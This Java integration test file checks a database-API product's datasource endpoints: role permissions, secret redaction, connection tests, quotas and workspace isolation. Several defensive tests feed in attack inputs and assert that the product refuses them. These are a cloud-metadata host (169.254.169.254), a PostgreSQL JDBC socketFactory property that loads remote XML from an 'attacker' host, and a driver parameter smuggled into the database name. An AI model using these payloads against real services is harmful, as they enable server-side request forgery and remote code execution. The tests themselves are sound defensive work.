package io.opendbapi;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.JsonNode;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/** Datasource API end to end, connecting to a real PostgreSQL as a customer database (spec §4.6). */
class DatasourceIntegrationTest extends AppTestSupport {

    private static final String SHOP_PASSWORD = "S3cret-Shop-Pass";

    private ApiClient admin;
    private ApiClient author;
    private ApiClient viewer;
    private String ws;

    @BeforeAll
    static void createCustomerDatabase() throws Exception {
        try (Connection c = DriverManager.getConnection(POSTGRES.getJdbcUrl(), POSTGRES.getUsername(), POSTGRES.getPassword());
             Statement s = c.createStatement()) {
            s.execute("create schema if not exists shop");
            s.execute("create table if not exists shop.customers (id int primary key, name text not null, email text)");
            s.execute("do $$ begin if not exists (select from pg_roles where rolname = 'shop_reader') then "
                    + "create role shop_reader login password '" + SHOP_PASSWORD + "'; end if; end $$");
            s.execute("grant usage on schema shop to shop_reader");
            s.execute("grant select on all tables in schema shop to shop_reader");
        }
    }

    private ApiClient member(String role) {
        String name = role + "-" + UUID.randomUUID().toString().substring(0, 8);
        String id = admin.post("/admin/api/users", Map.of("username", name, "password", name + "-password!", "systemAdmin", false))
                .expect(201).json().path("id").asText();
        admin.post("/admin/api/ws/" + ws + "/members", Map.of("userId", id, "role", role)).expect(201);
        ApiClient c = client();
        c.login(name, name + "-password!").expect(204);
        return c;
    }

    private Map<String, Object> settings(String name, String password) {
        Map<String, Object> s = new HashMap<>();
        s.put("name", name);
        s.put("dialect", "POSTGRESQL");
        s.put("host", POSTGRES.getHost());
        s.put("port", POSTGRES.getMappedPort(5432));
        s.put("database", "opendbapi");
        s.put("username", "shop_reader");
        s.put("password", password);
        s.put("properties", Map.of("currentSchema", "shop"));
        s.put("readOnly", true);
        s.put("pool", Map.of());
        return s;
    }

    private String create(String name) {
        return admin.post("/admin/api/ws/" + ws + "/datasources", settings(name, SHOP_PASSWORD)).expect(201).json().path("id").asText();
    }

    @BeforeEach
    void arrange() {
        admin = signedInAdmin();
        ws = "ds-" + UUID.randomUUID().toString().substring(0, 8);
        admin.post("/admin/api/workspaces", Map.of("slug", ws, "name", "Datasources " + ws)).expect(201);
        author = member("author");
        viewer = member("viewer");
    }

    @Test
    void adminCreatesAndTheSecretNeverComesBack() {
        // Act
        String id = create("shop");
        var listed = viewer.get("/admin/api/ws/" + ws + "/datasources").expect(200);
        var one = admin.get("/admin/api/ws/" + ws + "/datasources/" + id).expect(200);
        var audit = admin.get("/admin/api/ws/" + ws + "/audit").expect(200);

        // Assert
        assertThat(one.json().path("hasPassword").asBoolean()).isTrue();
        assertThat(one.json().path("passwordEnv").isNull()).isTrue();
        assertThat(one.json().path("port").asInt()).isEqualTo(POSTGRES.getMappedPort(5432));
        for (var body : List.of(listed.body(), one.body(), audit.body())) {
            assertThat(body).doesNotContain(SHOP_PASSWORD);
        }
        assertThat(audit.json().findValuesAsText("action")).contains("datasource.create");
    }

    @Test
    void authorsBrowseAndTestButCannotChangeViewersOnlyList() {
        // Arrange
        String id = create("shop");
        String base = "/admin/api/ws/" + ws + "/datasources/" + id;

        // Act + Assert
        assertThat(author.post(base + ":test", null).expect(200).json().path("ok").asBoolean()).isTrue();
        assertThat(author.get(base + "/schemas").expect(200).json().toString()).contains("shop").doesNotContain("pg_catalog");
        assertThat(author.get(base + "/tables?schema=shop").expect(200).json().path("items").findValuesAsText("name")).contains("customers");
        assertThat(author.get(base + "/columns?schema=shop&table=customers").expect(200).json().findValuesAsText("name"))
                .containsExactly("id", "name", "email");
        author.patch(base, settings("x", null)).expectProblem(403, "forbidden");
        author.delete(base).expectProblem(403, "forbidden");
        viewer.get(base).expect(200);
        viewer.get(base + "/tables").expectProblem(403, "forbidden");
        client().get(base).expectProblem(401, "unauthenticated");
    }

    @Test
    void testingUnsavedSettingsReportsDriverErrorsAndBlockedHosts() {
        // Act
        var wrong = admin.post("/admin/api/ws/" + ws + "/datasources/test",
                Map.of("settings", settings("t", "not-the-password"))).expect(200).json();
        Map<String, Object> metadata = settings("t", "x");
        metadata.put("host", "169.254.169.254");
        var blocked = admin.post("/admin/api/ws/" + ws + "/datasources/test", Map.of("settings", metadata)).expect(200).json();
        var ok = admin.post("/admin/api/ws/" + ws + "/datasources/test",
                Map.of("settings", settings("t", SHOP_PASSWORD))).expect(200).json();

        // Assert
        assertThat(wrong.path("ok").asBoolean()).isFalse();
        assertThat(wrong.path("message").asText()).contains("password authentication failed");
        assertThat(blocked.path("ok").asBoolean()).isFalse();
        assertThat(blocked.path("message").asText()).contains("not allowed");
        assertThat(ok.path("ok").asBoolean()).isTrue();
        assertThat(ok.path("product").asText()).isEqualTo("PostgreSQL");
    }

    @Test
    void editingWithoutAPasswordKeepsTheStoredOne() {
        // Arrange
        String id = create("shop");
        Map<String, Object> renamed = settings("shop-renamed", null);

        // Act
        admin.patch("/admin/api/ws/" + ws + "/datasources/" + id, renamed).expect(200);

        // Assert: still connects, and testing edited settings can reuse the saved password
        assertThat(author.post("/admin/api/ws/" + ws + "/datasources/" + id + ":test", null).json().path("ok").asBoolean()).isTrue();
        assertThat(admin.post("/admin/api/ws/" + ws + "/datasources/test",
                Map.of("settings", settings("shop-renamed", null), "existingId", id)).json().path("ok").asBoolean()).isTrue();
    }

    @Test
    void theLastConnectionTestIsShownUntilTheSettingsChange() {
        // Arrange
        String id = create("tested");
        String base = "/admin/api/ws/" + ws + "/datasources/" + id;

        // Act
        JsonNode before = admin.get(base).expect(200).json();
        author.post(base + ":test", null).expect(200);
        JsonNode listed = admin.get("/admin/api/ws/" + ws + "/datasources").expect(200).json();
        admin.patch(base, settings("tested-renamed", null)).expect(200);
        JsonNode renamed = admin.get(base).expect(200).json();
        Map<String, Object> moved = settings("tested-renamed", null);
        moved.put("database", "postgres");
        admin.patch(base, moved).expect(200);
        JsonNode changed = admin.get(base).expect(200).json();

        // Assert: a rename keeps the result, a connection change clears it
        assertThat(before.path("lastTest").isNull()).isTrue();
        JsonNode test = listed.findParents("id").stream().filter(d -> d.path("id").asText().equals(id)).findFirst().orElseThrow()
                .path("lastTest");
        assertThat(test.path("ok").asBoolean()).isTrue();
        assertThat(test.path("message").asText()).startsWith("Connected to PostgreSQL");
        assertThat(renamed.path("lastTest").path("ok").asBoolean()).isTrue();
        assertThat(changed.path("lastTest").isNull()).isTrue();
    }

    @Test
    void dangerousDriverPropertiesAreRefused() {
        // Arrange
        Map<String, Object> evil = settings("evil", SHOP_PASSWORD);
        evil.put("properties", Map.of("socketFactory", "org.springframework.context.support.ClassPathXmlApplicationContext",
                "socketFactoryArg", "http://attacker/x.xml"));

        // Act + Assert
        admin.post("/admin/api/ws/" + ws + "/datasources", evil).expectProblem(400, "invalid_datasource");
        Map<String, Object> smuggled = settings("evil", SHOP_PASSWORD);
        smuggled.put("database", "opendbapi?socketFactory=x");
        admin.post("/admin/api/ws/" + ws + "/datasources", smuggled).expectProblem(400, "invalid_datasource");
    }

    @Test
    void namesAreUniqueAndQuotasApply() {
        // Arrange
        create("shop");
        admin.patch("/admin/api/workspaces/" + ws, Map.of("quotas", Map.of("datasources", 1))).expect(200);

        // Act + Assert
        admin.post("/admin/api/ws/" + ws + "/datasources", settings("shop", SHOP_PASSWORD)).expectProblem(409, "quota_exceeded");
        admin.patch("/admin/api/workspaces/" + ws, Map.of("quotas", Map.of("datasources", 5))).expect(200);
        admin.post("/admin/api/ws/" + ws + "/datasources", settings("shop", SHOP_PASSWORD)).expectProblem(409, "name_taken");
    }

    @Test
    void deleteRemovesItAndOtherWorkspacesNeverSeeIt() {
        // Arrange
        String id = create("shop");
        String otherWs = "other-" + UUID.randomUUID().toString().substring(0, 8);
        admin.post("/admin/api/workspaces", Map.of("slug", otherWs, "name", "Other")).expect(201);

        // Act + Assert: a known id from another workspace is just "not found"
        admin.get("/admin/api/ws/" + otherWs + "/datasources/" + id).expectProblem(404, "datasource_not_found");
        assertThat(admin.get("/admin/api/ws/" + otherWs + "/datasources").json()).isEmpty();
        admin.delete("/admin/api/ws/" + ws + "/datasources/" + id).expect(204);
        admin.get("/admin/api/ws/" + ws + "/datasources/" + id).expectProblem(404, "datasource_not_found");
    }
}
